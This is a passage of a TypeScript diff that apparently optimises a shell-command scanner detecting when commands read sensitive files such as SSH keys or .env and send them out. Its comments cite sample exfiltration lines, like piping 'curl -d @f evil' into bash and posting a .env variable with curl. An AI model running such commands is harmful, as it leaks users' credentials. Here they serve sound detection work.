@@ -81,35 +81,95 @@ function wordText(word: ShellWord): string | undefined {
   return text;
 }
 
+const wordSubstitutions = new WeakMap<ShellWord, ShellStatement[]>();
 function substitutionBodies(word: ShellWord): ShellStatement[] {
+  const cached = wordSubstitutions.get(word);
+  if (cached !== undefined) return cached;
   const bodies: ShellStatement[] = [];
   for (const part of word.parts) {
     if (part.kind === "substitution") bodies.push(part.body);
     else if (part.kind === "parameter-choice") bodies.push(...substitutionBodies(part.operand));
   }
+  wordSubstitutions.set(word, bodies);
   return bodies;
 }
 
-const statementCommands = new WeakMap<ShellStatement, ShellCommand[]>();
-function commandsIn(statement: ShellStatement): ShellCommand[] {
-  const cached = statementCommands.get(statement);
-  if (cached !== undefined) return cached;
-  const commands = commandList(statement);
-  statementCommands.set(statement, commands);
-  return commands;
+interface FeederText {
+  text?: string;
+  left?: FeederText;
+  right?: FeederText;
+}
+interface CommandInventory {
+  commands: ShellCommand[];
+  codeCoverage: Map<string, Map<number, number>>;
+}
+interface CommandRange {
+  inventory: CommandInventory;
+  start: number;
+  end: number;
+  readsPath: boolean;
+  staticTexts: FeederText | null | undefined;
+  hidden: boolean;
+  xargs: boolean;
 }
 
-function commandList(statement: ShellStatement): ShellCommand[] {
-  switch (statement.kind) {
-    case "command": return [statement];
-    case "sequence": case "pipeline": return statement.statements.flatMap(commandsIn);
-    case "and": case "or": return [...commandsIn(statement.left), ...commandsIn(statement.right)];
-    case "subshell": case "background": case "negate": case "redirected": case "function":
-      return commandsIn(statement.body);
-    case "for": case "while": return commandsIn(statement.body);
-    case "if": return [...commandsIn(statement.condition), ...commandsIn(statement.consequent), ...commandsIn(statement.alternate)];
-    default: return [];
+function appendFeeder(left: FeederText | null, right: FeederText | null): FeederText | null {
+  return left === null ? right : right === null ? left : { left, right };
+}
+
+// One source inventory owns each direct syntax child. Ancestors retain ranges
+// and scalar/rope summaries instead of copying every descendant command.
+function commandRange(statement: ShellStatement, ctx: Context | ScanState): CommandRange {
+  const scan = "scan" in ctx ? ctx.scan : ctx;
+  const cached = scan.commandRanges.get(statement);
+  if (cached !== undefined) return cached;
+  const inventory: CommandInventory = { commands: [], codeCoverage: new Map() };
+  const index = (node: ShellStatement): CommandRange => {
+    scan.context.visits.inventory += 1;
+    const range: CommandRange = { inventory, start: inventory.commands.length, end: inventory.commands.length,
+      readsPath: false, staticTexts: null, hidden: false, xargs: false };
+    scan.commandRanges.set(node, range);
+    if (node.kind === "command") {
+      inventory.commands.push(node);
+      range.readsPath = readsPath(node);
+      const text = staticFeederText(node);
+      range.staticTexts = text === undefined ? undefined : { text };
+      range.hidden = needsCodeTextScan(node);
+      range.xargs = isXargsCommand(node);
+    } else {
+      let children: readonly ShellStatement[];
+      switch (node.kind) {
+        case "sequence": case "pipeline": children = node.statements; break;
+        case "and": case "or": children = [node.left, node.right]; break;
+        case "if": children = [node.condition, node.consequent, node.alternate]; break;
+        case "subshell": case "background": case "negate": case "redirected": case "function": case "for": case "while": children = [node.body]; break;
+        default: children = [];
+      }
+      for (const child of children) {
+        const summary = index(child);
+        range.readsPath ||= summary.readsPath;
+        range.hidden ||= summary.hidden;
+        range.xargs ||= summary.xargs;
+        range.staticTexts = range.staticTexts === undefined || summary.staticTexts === undefined
+          ? undefined : appendFeeder(range.staticTexts, summary.staticTexts);
+      }
+    }
+    range.end = inventory.commands.length;
+    return range;
+  };
+  return index(statement);
+}
+
+function feederText(text: FeederText, ctx: Context): string {
+  const parts: string[] = [];
+  const pending = [text];
+  while (pending.length > 0) {
+    const part = pending.pop()!;
+    ctx.scan.context.visits.feeder += 1;
+    if (part.text !== undefined) parts.push(part.text);
+    else { pending.push(part.right!, part.left!); }
   }
+  return parts.join("\n");
 }
 
 interface Context {
@@ -153,52 +213,65 @@ function readsPath(cmd: ShellCommand): boolean {
   return false;
 }
 
-function usesTainted(word: ShellWord, ctx: Context): boolean {
-  return word.parts.some((part) =>
-    (part.kind === "parameter" && ctx.tainted.has(part.name))
-    || (part.kind === "parameter-choice" && (ctx.tainted.has(part.name) || usesTainted(part.operand, ctx))));
+interface WordSources { variables: readonly string[]; readsPath: boolean }
+
+function wordSources(word: ShellWord, ctx: Context): WordSources {
+  const cached = ctx.scan.wordSources.get(word);
+  if (cached !== undefined) return cached;
+  const variables: string[] = [];
+  let file = false;
+  for (const part of word.parts) {
+    if (part.kind === "parameter" || part.kind === "parameter-choice") variables.push(part.name);
+    if (part.kind === "parameter-choice") {
+      const operand = wordSources(part.operand, ctx);
+      variables.push(...operand.variables);
+      file ||= operand.readsPath;
+    } else if (part.kind === "substitution") file ||= commandRange(part.body, ctx).readsPath;
+  }
+  const result = { variables, readsPath: file };
+  ctx.scan.wordSources.set(word, result);
+  return result;
 }
 
-// True when any word carries file data: a path-reading `$(…)` or a tainted variable.
+// Syntax dependencies are summarized once; propagation reads only those facts.
 function bodiesReadPath(words: readonly ShellWord[], ctx: Context): boolean {
-  if (words.some((word) => usesTainted(word, ctx))) return true;
-
-  return words.flatMap(substitutionBodies).flatMap(commandsIn).some((command) => readsPath(command));
+  return words.some((word) => {
+    const sources = wordSources(word, ctx);
+    return sources.readsPath || sources.variables.some((name) => ctx.tainted.has(name));
+  });
 }
 
-// Variables assigned from a file read anywhere in the command line (`X=$(cat.env); curl -d "$X" …`, `read X <.env`), to a fixed point so a copy (`Y=$X`) is tainted too.
+// Keep the existing eight propagation rounds and statement order. Only the
+// immutable source dependencies are compiled before applying those transfers.
 function collectTainted(root: ShellStatement, ctx: Context): void {
-
-  const all = commandsIn(root);
-  const nested = (statement: ShellStatement): ShellCommand[] => commandsIn(statement).flatMap((cmd) => [
-    cmd,
-    ...[...cmd.words, ...cmd.assignments.map((assignment) => assignment.value)].flatMap(substitutionBodies).flatMap(nested),
-  ]);
-  const commands = all.flatMap((cmd) => nested(cmd));
+  function* nested(statement: ShellStatement): Generator<ShellCommand> {
+    const range = commandRange(statement, ctx);
+    for (let index = range.start; index < range.end; index += 1) {
+      ctx.scan.context.visits.commands += 1;
+      const cmd = range.inventory.commands[index]!;
+      yield cmd;
+      for (const word of [...cmd.words, ...cmd.assignments.map((assignment) => assignment.value)]) {
+        for (const body of substitutionBodies(word)) yield* nested(body);
+      }
+    }
+  }
+  const commands = nested(root);
+  const transfers: { targets: readonly string[]; sources: readonly WordSources[]; readsPath: boolean }[] = [];
+  for (const cmd of commands) {
+    for (const assignment of cmd.assignments) transfers.push({ targets: [assignment.name],
+      sources: [assignment.value, ...(assignment.elements ?? [])].map((word) => wordSources(word, ctx)), readsPath: false });
+    const head = cmd.words[0] ? program(wordText(cmd.words[0])) : undefined;
+    if (head === "read" || head === "mapfile" || head === "readarray") {
+      const targets = cmd.words.slice(1).map(wordText).filter((name): name is string => name !== undefined && /^[A-Za-z_][A-Za-z0-9_]*$/.test(name));
+      transfers.push({ targets, readsPath: cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined),
+        sources: cmd.redirects.filter((redirect) => redirect.effect === "read" && redirect.data !== undefined).map((redirect) => wordSources(redirect.data!, ctx)) });
+    }
+  }
   for (let changed = true, guard = 0; changed && guard < 8; guard += 1) {
     changed = false;
-    for (const cmd of commands) {
-
-      for (const assignment of cmd.assignments) {
-
-        if (!ctx.tainted.has(assignment.name) && bodiesReadPath([assignment.value, ...(assignment.elements ?? [])], ctx)) {
-          ctx.tainted.add(assignment.name);
-          changed = true;
-        }
-      }
-      const head = cmd.words[0] ? program(wordText(cmd.words[0])) : undefined;
-      if (head === "read" || head === "mapfile" || head === "readarray") {
-        const fromFile = cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target !== undefined || (redirect.data !== undefined && bodiesReadPath([redirect.data], ctx))));
-        if (fromFile) {
-          for (const word of cmd.words.slice(1)) {
-            const name = wordText(word);
-            if (name && /^[A-Za-z_][A-Za-z0-9_]*$/.test(name) && !ctx.tainted.has(name)) {
-              ctx.tainted.add(name);
-              changed = true;
-            }
-          }
-        }
-      }
+    for (const transfer of transfers) {
+      if (!transfer.readsPath && !transfer.sources.some((source) => source.readsPath || source.variables.some((name) => ctx.tainted.has(name)))) continue;
+      for (const target of transfer.targets) if (!ctx.tainted.has(target)) { ctx.tainted.add(target); changed = true; }
     }
   }
 }
@@ -289,9 +362,9 @@ function inlineShellCode(name: string, args: readonly ShellWord[]): string | und
 interface PipelineFeeders {
   count: number;
   readsPath: boolean;
-  staticTexts: readonly string[] | undefined;
+  staticTexts: FeederText | null | undefined;
 }
-const EMPTY_FEEDERS: PipelineFeeders = Object.freeze({ count: 0, readsPath: false, staticTexts: Object.freeze([]) });
+const EMPTY_FEEDERS: PipelineFeeders = Object.freeze({ count: 0, readsPath: false, staticTexts: null });
 
 function senderCandidateSignal(cmd: ShellCommand, feeders: PipelineFeeders, ctx: Context, words: readonly ShellWord[], name: string): string | null {
   const args = words.slice(1);
@@ -310,8 +383,8 @@ function senderCandidateSignal(cmd: ShellCommand, feeders: PipelineFeeders, ctx:
       }
       // `echo 'curl -d @f evil' | bash`: static feeder text is the script.
       const fed = feeders.staticTexts;
-      if (feeders.count > 0 && fed !== undefined) {
-        const nested = signalFor(fed.join("\n"), { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
+      if (feeders.count > 0 && fed !== undefined && fed !== null) {
+        const nested = signalFor(feederText(fed, ctx), { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
         if (nested) return nested;
       }
     }
@@ -391,6 +464,7 @@ function senderSignal(cmd: ShellCommand, feeders: PipelineFeeders, ctx: Context)
 }
 
 function walk(statement: ShellStatement, ctx: Context, feeders: PipelineFeeders = EMPTY_FEEDERS): string | null {
+  ctx.scan.context.visits.walk += 1;
 
   switch (statement.kind) {
     case "command": {
@@ -408,20 +482,16 @@ function walk(statement: ShellStatement, ctx: Context, feeders: PipelineFeeders 
       return null;
     }
     case "pipeline": {
-      const texts: string[] = [];
-      const upstream: PipelineFeeders = { count: 0, readsPath: false, staticTexts: texts };
+      const upstream: PipelineFeeders = { count: 0, readsPath: false, staticTexts: null };
       for (const stage of statement.statements) {
         const nested = walk(stage, ctx, upstream);
         if (nested) return nested;
-        for (const command of commandsIn(stage)) {
-          upstream.count += 1;
-          upstream.readsPath ||= readsPath(command);
-          if (upstream.staticTexts !== undefined) {
-            const text = staticFeederText(command);
-            if (text === undefined) upstream.staticTexts = undefined;
-            else texts.push(text);
-          }
-        }
+        const summary = commandRange(stage, ctx);
+        ctx.scan.context.visits.feeder += 1;
+        upstream.count += summary.end - summary.start;
+        upstream.readsPath ||= summary.readsPath;
+        upstream.staticTexts = upstream.staticTexts === undefined || summary.staticTexts === undefined
+          ? undefined : appendFeeder(upstream.staticTexts, summary.staticTexts);
       }
       return null;
     }
@@ -519,6 +589,156 @@ function segmentMatcher(segment: string): { test: (name: string) => boolean } {
   } };
 }
 
+interface CodeToken { start: number; end: number; text: string; selected: boolean }
+interface CodeIndex {
+  brace: CodeToken[];
+  words: CodeToken[];
+  coverage: Map<string, Map<number, number>>;
+  partials: Map<string, CodeToken>;
+  partialCoverage: Map<string, Set<string>>;
+  bounds: Map<number, { braceStart: number; braceEnd: number; wordStart: number; wordEnd: number }>;
+}
+interface WordCodeRange { index: CodeIndex; start: number; end: number }
+
+function codePathContext(state: ScanState): string {
+  return JSON.stringify([state.cwds, state.cwdUnknown, state.metadataListing, state.dotglob,
+    state.ordinaryAsk !== undefined, state.sensitive]);
+}
+
+// A raw enclosing word and its nested words share one token index. Ancestor
+// path contexts still inspect the original raw tokens before any child cd.
+function wordCodeRange(word: ShellWord, state: ScanState): WordCodeRange {
+  const cached = state.codeRanges.get(word);
+  if (cached !== undefined) return cached;
+  const words: ShellWord[] = [];
+  const data: { start: number; end: number }[] = [];
+  const visit = (value: unknown): void => {
+    if (value === null || typeof value !== "object") return;
+    state.context.visits.codeNodes += 1;
+    if ("parts" in value && "source" in value && Array.isArray(value.parts)) {
+      const child = value as ShellWord;
+      if (isShellFloorLiteralData(child)) { data.push(child.source); return; }
+      words.push(child);
+      state.context.visits.codeWordLinks += 1;
+    }
+    for (const [key, child] of Object.entries(value)) {
+      if (key === "source") continue;
+      if (Array.isArray(child)) for (const item of child) visit(item);
+      else if (child !== null && typeof child === "object") visit(child);
+    }
+  };
+  visit(word);
+  const index: CodeIndex = { brace: [], words: [], coverage: new Map(), partials: new Map(), partialCoverage: new Map(), bounds: new Map() };
+  const names = new Set(sensitiveNames());
+  const segments: { start: number; end: number }[] = [];
+  const append = (start: number, end: number): void => {
+    segments.push({ start, end });
+    const text = word.source.raw.slice(start - word.source.start, end - word.source.start);
+    state.context.visits.codeSourceChars += 2 * text.length;
+    for (const match of text.matchAll(/[^\s'"\x60;|&()<>=:+]+/g)) {
+      index.brace.push({ start: start + match.index, end: start + match.index + match[0].length,
+        text: match[0], selected: match[0].includes("{") && match[0].includes("/") });
+      state.context.visits.codeTokenFacts += 1;
+    }
+    for (const match of text.matchAll(/[^\s'"\x60;|&()<>,{}[\]=:+]+/g)) {
+      index.words.push({ start: start + match.index, end: start + match.index + match[0].length,
+        text: match[0], selected: match[0].includes("/") || /^[.~$]/.test(match[0]) || names.has(match[0]) });
+      state.context.visits.codeTokenFacts += 1;
+    }
+  };
+  const dataAt = new Map(data.map((body) => [body.start, body]));
+  let end = word.source.start;
+  let offset = end;
+  while (offset < word.source.end) {
+    const body = dataAt.get(offset);
+    if (body !== undefined && body.end > offset && body.end <= word.source.end) {
+      append(end, offset);
+      offset = body.end;
+      end = offset;
+    } else { state.context.visits.codeSourceChars += 1; offset += 1; }
+  }
+  append(end, word.source.end);
+  // Register word boundaries in a single forward source pass. Nested views
+  // then obtain their token intervals with two constant-time map lookups.
+  const boundaries = new Set(words.flatMap((child) => [child.source.start, child.source.end]));
+  let braceStart = 0;
+  let braceEnd = 0;
+  let wordStart = 0;
+  let wordEnd = 0;
+  for (const segment of segments) for (let offset = segment.start; offset <= segment.end; offset += 1) {
+    state.context.visits.codeSourceChars += 1;
+    while (braceStart < index.brace.length && index.brace[braceStart]!.end <= offset) braceStart += 1;
+    while (braceEnd < index.brace.length && index.brace[braceEnd]!.start < offset) braceEnd += 1;
+    while (wordStart < index.words.length && index.words[wordStart]!.end <= offset) wordStart += 1;
+    while (wordEnd < index.words.length && index.words[wordEnd]!.start < offset) wordEnd += 1;
+    if (boundaries.has(offset)) index.bounds.set(offset, { braceStart, braceEnd, wordStart, wordEnd });
+  }
+  for (const child of words) if (index.bounds.has(child.source.start) && index.bounds.has(child.source.end)) {
+    state.codeRanges.set(child, { index, start: child.source.start, end: child.source.end });
+  }
+  return state.codeRanges.get(word)!;
+}
+
+function scanWordSourceCode(word: ShellWord, state: ScanState): void {
+  if (state.sensitive) return;
+  const range = wordCodeRange(word, state);
+  const context = codePathContext(state);
+  const scan = (tokens: readonly CodeToken[], brace: boolean): void => {
+    const coverageKey = `${brace ? "brace" : "word"}:${context}`;
+    let covered = range.index.coverage.get(coverageKey);
+    if (covered === undefined) { covered = new Map(); range.index.coverage.set(coverageKey, covered); }
+    const next = (from: number): number => {
+      let index = from;
+      const path: number[] = [];
+      while (covered!.has(index)) { state.context.visits.codeCoverage += 1; path.push(index); index = covered!.get(index)!; }
+      for (const previous of path) covered!.set(previous, index);
+      return index;
+    };
+    state.context.visits.codeRangeSteps += 2;
+    const startBounds = range.index.bounds.get(range.start)!;
+    const endBounds = range.index.bounds.get(range.end)!;
+    let first = brace ? startBounds.braceStart : startBounds.wordStart;
+    let end = brace ? endBounds.braceEnd : endBounds.wordEnd;
+    const partial = (source: CodeToken): void => {
+      const start = Math.max(range.start, source.start);
+      const end = Math.min(range.end, source.end);
+      const key = `${brace}:${start}:${end}`;
+      let token = range.index.partials.get(key);
+      if (token === undefined) {
+        const text = source.text.slice(start - source.start, end - source.start);
+        state.context.visits.codeSourceChars += 2 * text.length;
+        token = { start, end, text, selected: brace ? text.includes("{") && text.includes("/")
+          : text.includes("/") || /^[.~$]/.test(text) || new Set(sensitiveNames()).has(text) };
+        range.index.partials.set(key, token);
+        state.context.visits.codeTokenFacts += 1;
+      }
+      let contexts = range.index.partialCoverage.get(key);
+      if (contexts === undefined) { contexts = new Set(); range.index.partialCoverage.set(key, contexts); }
+      if (!contexts.has(context)) {
+        state.context.visits.codeTokenUses += 1;
+        if (token.selected) checkRawText(token.text, state);
+        contexts.add(context);
+      }
+    };
+    // Edge fragments have a different raw boundary from the complete token.
+    // They cannot reuse, or mark, that complete token's contextual proof.
+    if (first < end && tokens[first]!.start < range.start) partial(tokens[first++]!);
+    if (state.sensitive) return;
+    const last = end > first && tokens[end - 1]!.end > range.end ? tokens[--end] : undefined;
+    for (let position = next(first); position < end; position = next(position)) {
+      const token = tokens[position]!;
+      state.context.visits.codeTokenUses += 1;
+      if (token.selected) checkRawText(token.text, state);
+      covered.set(position, next(position + 1));
+      if (state.sensitive) return;
+    }
+    if (last) partial(last);
+
+  };
+  scan(range.index.brace, true);
+  if (!state.sensitive) scan(range.index.words, false);
+}
+
 // The sensitive-table pattern a (possibly glob) path can reach, or null. Wildcard segments are instantiated with every sensitive name they match that exists in that directory (dot names only when the segment starts with `.`, as bash does without `dotglob`) plus one ordinary filler.
 
 // A failed structural expansion is incomplete path evidence.
@@ -614,41 +834,67 @@ function argumentCandidates(glob: string): string[] {
 
 // Bash brace expansion (`~/.{ssh,aws}/x`); a range (`{1..9}`) becomes a wildcard.
 function expandBraces(text: string): string[] {
-
-  for (let open = 0; open < text.length; open += 1) {
-
-    if (text[open] === "\\") { open += 1; continue; }
-    if (text[open] !== "{") continue;
-    let depth = 0;
-    let close = open;
-    const commas: number[] = [];
-    for (; close < text.length; close += 1) {
-
-      const char = text[close];
-      if (char === "\\") { close += 1; continue; }
-      if (char === "{") depth += 1;
-      else if (char === "}") { depth -= 1; if (depth === 0) break; }
-      else if (char === "," && depth === 1) commas.push(close);
-    }
-    if (close >= text.length) return [text];
-    const head = text.slice(0, open);
-    const tail = text.slice(close + 1);
-    if (commas.length === 0) {
-      if (text.slice(open + 1, close).includes("..")) return expandBraces(`${head}*${tail}`);
-      continue;
-    }
-    const bounds = [open, ...commas, close];
-    const out: string[] = [];
-    for (let index = 0; index + 1 < bounds.length; index += 1) {
-      for (const expanded of expandBraces(head + text.slice(bounds[index]! + 1, bounds[index + 1]) + tail)) {
-
-        if (out.length >= BRACE_EXPANSION_LIMIT) return out;
-        out.push(expanded);
+  interface Brace { close: number; commas: number[]; range: boolean; dots: number }
+  const braces = new Map<number, Brace>();
+  const open: { index: number; brace: Brace }[] = [];
+  let dots = 0;
+  let escaped = false;
+  for (let index = 0; index < text.length; index += 1) {
+    const char = text[index]!;
+    if (char === "." && text[index - 1] === ".") dots += 1;
+    if (escaped) { escaped = false; continue; }
+    if (char === "\\") { escaped = true; continue; }
+    if (char === "{") open.push({ index, brace: { close: -1, commas: [], range: false, dots } });
+    else if (char === ",") open.at(-1)?.brace.commas.push(index);
+    else if (char === "}") {
+      const parent = open.pop();
+      if (parent) {
+        parent.brace.close = index;
+        parent.brace.range = dots > parent.brace.dots;
+        braces.set(parent.index, parent.brace);
       }
     }
-    return out;
   }
-  return [text];
+  interface Span { start: number; end: number }
+  interface Expansion { spans: Span[]; pieces: string[] }
+  const pending: Expansion[] = [{ spans: [{ start: 0, end: text.length }], pieces: [] }];
+  const out: string[] = [];
+  while (pending.length > 0) {
+    const expansion = pending.pop()!;
+    let branched = false;
+    while (expansion.spans.length > 0 && !branched) {
+      const span = expansion.spans.pop()!;
+      let literal = span.start;
+      for (let index = span.start; index < span.end; index += 1) {
+        if (text[index] === "\\") { index += 1; continue; }
+        if (text[index] !== "{") continue;
+        const brace = braces.get(index);
+        if (!brace || brace.close >= span.end) break;
+        if (brace.commas.length === 0) {
+          if (brace.range) {
+            expansion.pieces.push(text.slice(literal, index), "*");
+            index = brace.close;
+            literal = index + 1;
+          }
+          continue;
+        }
+        expansion.pieces.push(text.slice(literal, index));
+        const bounds = [index, ...brace.commas, brace.close];
+        for (let option = bounds.length - 2; option >= 0; option -= 1) {
+          pending.push({ pieces: [...expansion.pieces], spans: [...expansion.spans,
+            { start: brace.close + 1, end: span.end }, { start: bounds[option]! + 1, end: bounds[option + 1]! }] });
+        }
+        branched = true;
+        break;
+      }
+      if (!branched) expansion.pieces.push(text.slice(literal, span.end));
+    }
+    if (!branched) {
+      out.push(expansion.pieces.join(""));
+      if (out.length >= BRACE_EXPANSION_LIMIT) return out;
+    }
+  }
+  return out;
 }
 
 // Glob texts for shell text the AST did not lower (`~user/…`, `{a,b}`) or for a code token.
@@ -702,12 +948,14 @@ interface ScanState {
   // The command is a pipeline stage whose output an `xargs` stage turns into arguments.
   feedsXargs: boolean;
   // For an `xargs` pipeline stage, the stages before it, whose output becomes its arguments.
-  xargsUpstream?: { commands: readonly ShellCommand[]; length: number; checked: Map<string, number> };
+  xargsUpstream?: { commands: readonly ShellCommand[]; start: number; length: number; checked: Map<string, number> };
   // The command only lists names and metadata (`ls`, `du`, `stat`), so a glob whose expansion reaches a protected directory reads no store content.
   metadataListing: boolean;
   // Ask reason for a read the scan cannot bound but the OS floor confines: a metadata listing glob that expands into a protected directory, or a recursive reader fed static, ordinary roots through `xargs`. Like cdAsk it keeps path checks canonical.
   confinedAsk?: string;
   functions: { body: ShellStatement; version: number }[];
+  functionRegistryVersion: number;
+  functionsByBody: Map<ShellStatement, { body: ShellStatement; version: number }>;
   dotglob: boolean;
   sensitive: string | null;
   network: boolean;
@@ -718,6 +966,11 @@ interface ScanState {
   match: (path: string) => string | null;
   pathResults: Map<string, string | null>;
   context: ShellFloorContext;
+  transfers: WeakMap<ShellStatement, StatementTransfer>;
+  nestedSignals: Map<string, { signal: string | null; effects: ScanEffects }>;
+  wordSources: WeakMap<ShellWord, WordSources>;
+  commandRanges: WeakMap<ShellStatement, CommandRange>;
+  codeRanges: WeakMap<ShellWord, WordCodeRange>;
 }
 
 function canonicalFloorPath(path: string, context = new ShellFloorContext(), normalized = false): string {
@@ -728,8 +981,8 @@ function createScanState(cwd: string | undefined, dotglob: boolean, command = ""
   const state: ScanState = { cwds: [cwd], cwdUnknown: false, cwdVersion: 0, dirChanged: false,
     homeReassigned: HOME_REASSIGNMENT.test(command),
     cdRedirects: CD_REDIRECTION.test(command) || (process.env.CDPATH ?? "") !== "",
-    functions: [], feedsXargs: false, metadataListing: false, dotglob, sensitive: null, network: false, hidden: false,
-    match: (path) => context.matchPath(path), pathResults: new Map(), context };
+    functions: [], functionRegistryVersion: 0, functionsByBody: new Map(), feedsXargs: false, metadataListing: false, dotglob, sensitive: null, network: false, hidden: false,
+    match: (path) => context.matchPath(path), pathResults: new Map(), context, transfers: new WeakMap(), nestedSignals: new Map(), wordSources: new WeakMap(), commandRanges: new WeakMap(), codeRanges: new WeakMap() };
   if (/auto_?cd/i.test(command)) markCwdUnknown(state, "autocd can change directory");
   return state;
 }
@@ -834,9 +1087,30 @@ function checkWord(word: ShellWord, state: ScanState): void {
   scanEachHome((home) => {
     if (raw) return;
     const glob = wordGlob(word, home);
-    if (glob === null) { raw = true; checkRawText(word.source.raw, state); }
+    if (glob === null) { raw = true; checkRawText(ownWordText(word), state); }
     else checkGlob(glob, state);
   });
+}
+
+// Nested syntax owns its own inspection. Only the disjoint outer slices are
+// token-scanned here; no grammar is inferred from the resulting text.
+const ownWordTexts = new WeakMap<ShellWord, string>();
+function ownWordText(word: ShellWord): string {
+  const cached = ownWordTexts.get(word);
+  if (cached !== undefined) return cached;
+  const children = word.parts.flatMap((part) => part.kind === "substitution" ? [part.body.source]
+    : part.kind === "parameter-choice" ? [part.operand.source] : []);
+  let end = word.source.start;
+  const text: string[] = [];
+  for (const child of children) {
+    if (child.start < end || child.end > word.source.end) continue;
+    text.push(word.source.raw.slice(end - word.source.start, child.start - word.source.start), DYNAMIC_SEGMENT);
+    end = child.end;
+  }
+  text.push(word.source.raw.slice(end - word.source.start));
+  const own = text.join("");
+  ownWordTexts.set(word, own);
+  return own;
 }
 
 // Path-like tokens inside code the matcher cannot parse (`open("/home/u/.ssh/id_rsa")`).
@@ -884,10 +1158,39 @@ function needsCodeTextScan(cmd: ShellCommand): boolean {
   return argv[0] === undefined || hiddenCodeReason(argv) !== null || opaqueRunnerReason(argv) !== null;
 }
 
+// Covered source-index ranges are skipped before their commands are consumed.
+// The successor links compress already-covered spans for each path context.
+function scanRangeCode(range: CommandRange, state: ScanState): void {
+  const key = JSON.stringify([state.cwds, state.cwdUnknown, state.metadataListing, state.dotglob,
+    state.ordinaryAsk !== undefined, state.sensitive]);
+  let covered = range.inventory.codeCoverage.get(key);
+  if (covered === undefined) { covered = new Map(); range.inventory.codeCoverage.set(key, covered); }
+  const next = (from: number): number => {
+    let index = from;
+    const path: number[] = [];
+    while (covered!.has(index)) {
+      state.context.visits.coverage += 1;
+      path.push(index);
+      index = covered!.get(index)!;
+    }
+    for (const previous of path) covered!.set(previous, index);
+    return index;
+  };
+  for (let index = next(range.start); index < range.end; index = next(index)) {
+    scanCodeOf(range.inventory.commands[index]!, state);
+    covered.set(index, next(index + 1));
+  }
+}
+
 function scanCodeOf(cmd: ShellCommand, state: ScanState): void {
+  state.context.visits.code += 1;
   for (const word of cmd.words) scanWordCodeText(word, state);
   for (const redirect of cmd.redirects) {
-    if (redirect.data && !isShellFloorLiteralData(redirect.data)) scanCodeText(staticShellWord(redirect.data) ?? redirect.data.source.raw, state);
+    if (redirect.data && !isShellFloorLiteralData(redirect.data)) {
+      const text = staticShellWord(redirect.data);
+      if (text === undefined) scanWordSourceCode(redirect.data, state);
+      else scanCodeText(text, state);
+    }
   }
 }
 
@@ -896,7 +1199,8 @@ function scanCodeOf(cmd: ShellCommand, state: ScanState): void {
 function scanWordCodeText(word: ShellWord, state: ScanState): void {
   if (isShellFloorLiteralData(word)) return;
   const text = staticShellWord(word);
-  if (text === undefined || /[\s'"`;|&()<>{}\[\]=:+]/.test(text)) scanCodeText(text ?? word.source.raw, state);
+  if (text === undefined) scanWordSourceCode(word, state);
+  else if (/[\s'"`;|&()<>{}\[\]=:+]/.test(text)) scanCodeText(text, state);
 }
 
 function scanRedirectTarget(target: ShellWord, state: ScanState): void {
@@ -1226,7 +1530,7 @@ function xargsUpstreamReach(state: ScanState): string | null {
   if (upstream === undefined) return null;
   const key = cwds.join("\0");
   for (let index = upstream.checked.get(key) ?? 0; index < upstream.length; index += 1) {
-    const cmd = upstream.commands[index]!;
+    const cmd = upstream.commands[upstream.start + index]!;
       for (const word of cmd.words.slice(1)) {
 
         if (literalHead(word).startsWith("-")) continue;
@@ -1497,81 +1801,154 @@ function scanGitObjectPaths(cmd: ShellCommand, state: ScanState): void {
   }
 }
 
+interface StatementTransfer {
+  apply: (state: ScanState) => void;
+  results: Map<string, ScanEffects>;
+}
+
+interface ScanEffects {
+  cwds: ScanState["cwds"];
+  cwdUnknown: boolean;
+  cwdVersion: number;
+  dirChanged: boolean;
+  cdSuccess: ScanState["cdSuccess"];
+  cdAsk: string | undefined;
+  confinedAsk: string | undefined;
+  ordinaryAsk: string | undefined;
+  sensitive: string | null;
+  network: boolean;
+  hidden: boolean;
+  sender: boolean | undefined;
+}
+
+// Source facts are compiled once. Transfers retain the original cwd fixed point,
+// and memoize each complete incoming path context instead of revisiting syntax.
+// Registry membership/cwd revisions never decrease: a transfer that changes either cannot
+// hit its former input key. The xargs cache identity also stays part of the key.
+function scanContextKey(state: ScanState): string {
+  const upstream = state.xargsUpstream;
+  return JSON.stringify([state.cwds, state.cwdVersion, state.functionRegistryVersion, state.cwdUnknown, state.dirChanged, state.cdSuccess,
+    state.homeReassigned, state.cdRedirects, state.feedsXargs, state.metadataListing,
+    state.ordinaryAsk !== undefined, state.sensitive, state.network, state.hidden, state.sender, upstream && state.context.identity(upstream.commands), upstream?.start, upstream?.length, upstream && state.context.identity(upstream.checked)]);
+}
+
+function scanEffects(state: ScanState): ScanEffects {
+  return { cwds: [...state.cwds], cwdUnknown: state.cwdUnknown, cwdVersion: state.cwdVersion,
+    dirChanged: state.dirChanged, cdSuccess: state.cdSuccess && [...state.cdSuccess],
+    cdAsk: state.cdAsk, confinedAsk: state.confinedAsk, ordinaryAsk: state.ordinaryAsk,
+    sensitive: state.sensitive, network: state.network, hidden: state.hidden, sender: state.sender };
+}
+
+function applyScanEffects(state: ScanState, effects: ScanEffects): void {
+  state.cwds = [...effects.cwds];
+  state.cwdUnknown ||= effects.cwdUnknown;
+  state.cwdVersion = Math.max(state.cwdVersion, effects.cwdVersion);
+  state.dirChanged ||= effects.dirChanged;
+  state.cdSuccess = effects.cdSuccess && [...effects.cdSuccess];
+  state.cdAsk ??= effects.cdAsk;
+  state.confinedAsk ??= effects.confinedAsk;
+  state.ordinaryAsk ??= effects.ordinaryAsk;
+  state.sensitive ??= effects.sensitive;
+  state.network ||= effects.network;
+  state.hidden ||= effects.hidden;
+  state.sender ||= effects.sender;
+}
+
 function scanStatement(statement: ShellStatement, state: ScanState): void {
+  let transfer = state.transfers.get(statement);
+  if (transfer === undefined) {
+    state.context.visits.stages += 1;
+    transfer = { apply: compileStatement(statement, state), results: new Map() };
+    state.transfers.set(statement, transfer);
+  }
+  const key = scanContextKey(state);
+  const cached = transfer.results.get(key);
+  if (cached !== undefined) { applyScanEffects(state, cached); return; }
+  state.context.visits.transfers += 1;
+  transfer.apply(state);
+  transfer.results.set(key, scanEffects(state));
+}
+
+function compileStatement(statement: ShellStatement, source: ScanState): (state: ScanState) => void {
 
   switch (statement.kind) {
     case "command": {
-
-      // `env -C`, `git -C`, `make -C`, `tar -C`, `--prefix` … move this command alone.
-      const restoreCwd = applyCommandCwdSwitch(statement, state);
-      const metadataListing = state.metadataListing;
